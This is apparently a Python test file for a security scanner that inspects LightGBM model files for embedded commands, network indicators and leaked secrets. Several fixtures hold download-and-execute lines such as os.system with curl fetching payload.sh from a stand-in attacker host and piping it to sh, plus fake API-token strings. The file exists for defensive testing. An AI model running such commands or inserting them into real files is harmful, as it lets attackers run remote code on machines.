"""Tests for native LightGBM scanner and routing behavior."""

from __future__ import annotations

from pathlib import Path

import pytest

from modelaudit.analysis.unified_context import UnifiedMLContext
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.models import ModelAuditResultModel
from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.lightgbm_scanner import LightGBMScanner
from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension, validate_file_type


def _build_lightgbm_text(extra_lines: list[str] | None = None) -> str:
    base_lines = [
        "tree",
        "version=v4",
        "num_class=1",
        "num_tree_per_iteration=1",
        "max_feature_idx=2",
        "feature_names=f0 f1 f2",
        "feature_infos=[0:1] [0:1] [0:1]",
        "tree_sizes=12",
        "Tree=0",
        "num_leaves=2",
        "split_feature=0",
        "split_gain=1.0",
        "threshold=0.5",
        "decision_type=<=",
        "left_child=-1",
        "right_child=-2",
        "leaf_value=0.1 0.2",
    ]
    if extra_lines:
        base_lines.extend(extra_lines)
    return "\n".join(base_lines) + "\n"


def _check_by_name(result: ScanResult, name: str) -> list[Check]:
    return [check for check in result.checks if check.name == name]


def _scan_without_cache(path: Path) -> ModelAuditResultModel:
    return scan_model_directory_or_file(str(path), cache_scan_results=False)


def _assert_lightgbm_read_failure(
    direct: ScanResult,
    aggregate: ModelAuditResultModel,
    path: Path,
) -> None:
    read_checks = _check_by_name(direct, "LightGBM File Read")
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "lightgbm_read_failed"
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "lightgbm_read_failed" in direct.metadata["scan_outcome_reasons"]
    assert direct.metadata["operational_error"] is True
    assert direct.metadata["operational_error_reason"] == "lightgbm_read_failed"

    metadata = aggregate.file_metadata[str(path)]
    assert "lightgbm_read_failed" in metadata["scan_outcome_reasons"]
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_can_handle_lightgbm_text_model(tmp_path: Path) -> None:
    path = tmp_path / "native.model"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    assert LightGBMScanner.can_handle(str(path))


def test_can_handle_lightgbm_binary_like_model(tmp_path: Path) -> None:
    path = tmp_path / "native.lgb"
    payload = b"\x00\x01\x02LGBM\x00" + _build_lightgbm_text().replace("\n", "\x00").encode("utf-8")
    path.write_bytes(payload)

    assert LightGBMScanner.can_handle(str(path))


def test_can_handle_lightgbm_model_with_misleading_suffix(tmp_path: Path) -> None:
    path = tmp_path / "renamed.jpg"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    assert LightGBMScanner.can_handle(str(path))


def test_can_handle_rejects_renamed_lightgbm_near_match(tmp_path: Path) -> None:
    path = tmp_path / "near_match.jpg"
    path.write_text("tree=0\nversion=v4\nnum_class=1\n", encoding="utf-8")

    assert not LightGBMScanner.can_handle(str(path))


def test_can_handle_rejects_xgboost_like_model_content(tmp_path: Path) -> None:
    path = tmp_path / "xgb.model"
    path.write_text('{"learner":{"gradient_booster":{"name":"gbtree","tree_param":{}}}}', encoding="utf-8")

    assert not LightGBMScanner.can_handle(str(path))


@pytest.mark.parametrize(
    ("suffix", "expected"),
    [
        (".lgb", True),
        (".lightgbm", True),
        (".model", False),
        (".txt", False),
    ],
)
def test_can_handle_only_claims_unreadable_dedicated_lightgbm_extensions(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    suffix: str,
    expected: bool,
) -> None:
    path = tmp_path / f"unreadable{suffix}"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated LightGBM signature read failure")

    monkeypatch.setattr("modelaudit.scanners.lightgbm_scanner.open", raise_os_error, raising=False)

    assert LightGBMScanner.can_handle(str(path)) is expected


def test_scan_benign_lightgbm_model_avoids_critical_false_positives(tmp_path: Path) -> None:
    path = tmp_path / "benign.lightgbm"
    path.write_text(
        _build_lightgbm_text(
            [
                "feature_names=system_health execution_time_ms parse_metric",
                "parameters:",
                "[metric: l2]",
            ]
        ),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    assert result.success is True
    assert all(check.severity != IssueSeverity.CRITICAL for check in result.checks)

    command_checks = _check_by_name(result, "Command Indicator Check")
    assert len(command_checks) == 1
    assert command_checks[0].status == CheckStatus.PASSED


def test_scan_detects_command_and_network_correlation(tmp_path: Path) -> None:
    path = tmp_path / "malicious.model"
    path.write_text(
        _build_lightgbm_text(
            [
                "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')",
                "callback_url=https://collector.evil.example/payload.sh",
            ]
        ),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    command_checks = _check_by_name(result, "Command Indicator Check")
    assert len(command_checks) == 1
    assert command_checks[0].status == CheckStatus.FAILED
    assert command_checks[0].severity == IssueSeverity.CRITICAL

    network_checks = _check_by_name(result, "Network Indicator Check")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.FAILED

    correlation_checks = _check_by_name(result, "Command/Network Correlation Check")
    assert len(correlation_checks) == 1
    assert correlation_checks[0].status == CheckStatus.FAILED
    assert correlation_checks[0].severity == IssueSeverity.CRITICAL
    assert correlation_checks[0].details["same_fragment_correlation"] is True


def test_whitelisted_lightgbm_preserves_same_line_correlation(tmp_path: Path) -> None:
    from modelaudit.whitelists import POPULAR_MODELS

    path = tmp_path / "same_line.model"
    path.write_text(
        _build_lightgbm_text(["metadata=os.system('curl https://collector.evil.example/upload | sh')"]),
        encoding="utf-8",
    )
    scanner = LightGBMScanner()
    scanner.context = UnifiedMLContext(
        file_path=path,
        file_size=path.stat().st_size,
        file_type=".model",
        model_id=next(iter(POPULAR_MODELS)),
        model_source="huggingface",
    )

    result = scanner.scan(str(path))

    correlation_check = _check_by_name(result, "Command/Network Correlation Check")[0]
    assert correlation_check.severity == IssueSeverity.CRITICAL
    assert correlation_check.details["same_fragment_correlation"] is True
    assert correlation_check.details.get("whitelist_downgrade") is None


def test_whitelisted_lightgbm_downgrades_cross_line_correlation(tmp_path: Path) -> None:
    from modelaudit.whitelists import POPULAR_MODELS

    path = tmp_path / "cross_line.model"
    path.write_text(
        _build_lightgbm_text(
            [
                "metadata=os.system('echo benchmark')",
                "callback_url=https://collector.evil.example/upload",
            ]
        ),
        encoding="utf-8",
    )
    scanner = LightGBMScanner()
    scanner.context = UnifiedMLContext(
        file_path=path,
        file_size=path.stat().st_size,
        file_type=".model",
        model_id=next(iter(POPULAR_MODELS)),
        model_source="huggingface",
    )

    result = scanner.scan(str(path))

    correlation_check = _check_by_name(result, "Command/Network Correlation Check")[0]
    assert correlation_check.status == CheckStatus.FAILED
    assert correlation_check.severity == IssueSeverity.INFO
    assert correlation_check.details["same_fragment_correlation"] is False
    assert correlation_check.details["whitelist_downgrade"] is True


def test_scan_bounded_lightgbm_window_is_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "bounded.model"
    path.write_text(_build_lightgbm_text(["metadata=" + ("safe " * 200)]), encoding="utf-8")

    result = LightGBMScanner(config={"lightgbm_scan_budget": 256}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "lightgbm_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]


def test_lightgbm_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unreadable.lightgbm"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated LightGBM read failure")

    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.lightgbm_scanner.open", raise_os_error, raising=False)

    direct = LightGBMScanner().scan(str(path))
    aggregate = _scan_without_cache(path)

    _assert_lightgbm_read_failure(direct, aggregate, path)


def test_lightgbm_unreadable_path_preflight_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "permission-denied.lightgbm"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    def deny_access(_path: str, _mode: int) -> bool:
        return False

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated permission-denied read failure")

    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_access)
    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
    monkeypatch.setattr("modelaudit.scanners.lightgbm_scanner.open", raise_os_error, raising=False)

    direct = LightGBMScanner().scan(str(path))
    aggregate = _scan_without_cache(path)

    _assert_lightgbm_read_failure(direct, aggregate, path)


def test_lightgbm_read_failure_takes_operational_precedence_over_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable = tmp_path / "unreadable.lightgbm"
    unreadable.write_text(_build_lightgbm_text(), encoding="utf-8")
    malicious = tmp_path / "malicious.lightgbm"
    malicious.write_text(
        _build_lightgbm_text(["metadata=os.system('curl https://collector.evil.example/payload.sh | sh')"]),
        encoding="utf-8",
    )

    def deny_only_unreadable(path: str, _mode: int) -> bool:
        return Path(path).name != unreadable.name

    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_only_unreadable)

    aggregate = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    metadata = aggregate.file_metadata[str(unreadable)]
    assert metadata["operational_error_reason"] == "lightgbm_read_failed"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
    assert aggregate.has_errors is True
    assert determine_exit_code(aggregate) == 2


def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
    path = tmp_path / "network_secret.model"
    hostname_secrets = [
        "arbitrary-customer-secret-1234567890",
        "sk-" + ("a" * 30),
        "AIza" + ("a" * 35),
        "hf_" + ("a" * 36),
        "glpat-" + ("a" * 20),
        "SG." + ("a" * 22) + "." + ("b" * 43),
        "eyJ" + ("a" * 18) + ".eyJ" + ("b" * 28) + "." + ("c" * 18),
    ]
    benign_hostname = "sk-documentation-20260604.evil.example"
    path.write_text(
        _build_lightgbm_text(
            [
                (
                    "api_key=LGB_ADJACENT_SECRET Authorization: Bearer LGB_BEARER_SECRET "
                    "metadata=os.system('curl LGB_STANDALONE_SECRET "
                    "https://lgb_user:lgb_pass@collector.evil.example/"
                    "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag | sh') "
                ),
                "callback_url=https://lgb_user:lgb_pass@collector.evil.example/"
                + "LGB_PATH_SECRET/payload.sh?token=LGB_SECRET#frag",
                *(f"callback_url=https://{secret}.evil.example/payload.sh" for secret in hostname_secrets),
                f"callback_url=https://{benign_hostname}/model.txt",
            ]
        ),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    network_checks = _check_by_name(result, "Network Indicator Check")
    assert len(network_checks) == 1
    assert network_checks[0].details == {
        "examples": (
            [
                {
                    "line": str(line_number),
                    "type": "url",
                    "value_omitted": "model_text_may_contain_sensitive_literals",
                }
                for line_number in range(18, 21 + len(hostname_secrets))
            ]
        )
    }

    failed_details = " ".join(
        str(check.details) for check in result.checks if check.status == CheckStatus.FAILED
    ).lower()
    assert "lgb_user" not in failed_details
    assert "lgb_pass" not in failed_details
    assert "lgb_secret" not in failed_details
    assert "lgb_path_secret" not in failed_details
    assert "lgb_adjacent_secret" not in failed_details
    assert "lgb_bearer_secret" not in failed_details
    assert "lgb_standalone_secret" not in failed_details
    assert all(secret.lower() not in failed_details for secret in hostname_secrets)
    assert benign_hostname not in failed_details
    assert "model_text_may_contain_sensitive_literals" in failed_details
    assert "payload.sh" not in failed_details
    assert "#frag" not in failed_details


def test_scan_correlates_command_with_trusted_download_url(tmp_path: Path) -> None:
    path = tmp_path / "trusted_download.model"
    path.write_text(
        _build_lightgbm_text(
            ["metadata=os.system('curl https://github.com/example/project/releases/payload.sh | sh')"]
        ),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    network_checks = _check_by_name(result, "Network Indicator Check")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.FAILED
    assert network_checks[0].details == {
        "examples": [
            {
                "line": "18",
                "type": "url",
                "value_omitted": "model_text_may_contain_sensitive_literals",
            }
        ]
    }
    correlation_checks = _check_by_name(result, "Command/Network Correlation Check")
    assert len(correlation_checks) == 1
    assert correlation_checks[0].status == CheckStatus.FAILED
    assert correlation_checks[0].severity == IssueSeverity.CRITICAL


def test_scan_omits_ip_literal_network_values(tmp_path: Path) -> None:
    path = tmp_path / "ip_literal.model"
    path.write_text(
        _build_lightgbm_text(
            [
                "metadata=os.system('curl https://8.8.8.8/payload.sh | sh')",
                "callback_ip=1.1.1.1",
            ]
        ),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    network_checks = _check_by_name(result, "Network Indicator Check")
    assert len(network_checks) == 1
    assert network_checks[0].details == {
        "examples": [
            {
                "line": "18",
                "type": "url",
                "value_omitted": "model_text_may_contain_sensitive_literals",
            },
            {
                "line": "19",
                "type": "public_ip",
                "value_omitted": "model_text_may_contain_sensitive_literals",
            },
        ]
    }
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "8.8.8.8" not in failed_details
    assert "1.1.1.1" not in failed_details


def test_scan_ignores_benign_trusted_reference_url(tmp_path: Path) -> None:
    path = tmp_path / "trusted_reference.model"
    path.write_text(
        _build_lightgbm_text(["documentation=https://lightgbm.readthedocs.io/en/latest/"]),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    network_checks = _check_by_name(result, "Network Indicator Check")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_file_fails_signature_validation(tmp_path: Path) -> None:
    path = tmp_path / "corrupt.lgb"
    path.write_bytes(b"\x00\xff\x10\x00not-a-lightgbm-model")

    result = LightGBMScanner().scan(str(path))

    assert result.success is False
    signature_checks = _check_by_name(result, "LightGBM Signature Validation")
    assert len(signature_checks) == 1
    assert signature_checks[0].status == CheckStatus.FAILED


def test_routing_disambiguates_lightgbm_and_xgboost_model_extension(tmp_path: Path) -> None:
    lightgbm_path = tmp_path / "lightgbm.model"
    lightgbm_path.write_text(_build_lightgbm_text(), encoding="utf-8")

    xgboost_path = tmp_path / "xgboost.model"
    xgboost_path.write_bytes(b"gbtree\x00\x00\x01\x02")

    lightgbm_scanner = get_scanner_for_file(str(lightgbm_path))
    xgboost_scanner = get_scanner_for_file(str(xgboost_path))

    assert lightgbm_scanner is not None
    assert lightgbm_scanner.name == "lightgbm"

    assert xgboost_scanner is not None
    assert xgboost_scanner.name == "xgboost"


def test_detection_helpers_cover_lightgbm_extension(tmp_path: Path) -> None:
    path = tmp_path / "model.lgb"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    assert detect_file_format(str(path)) == "lightgbm"
    assert detect_format_from_extension(str(path)) == "lightgbm"
    assert validate_file_type(str(path)) is True
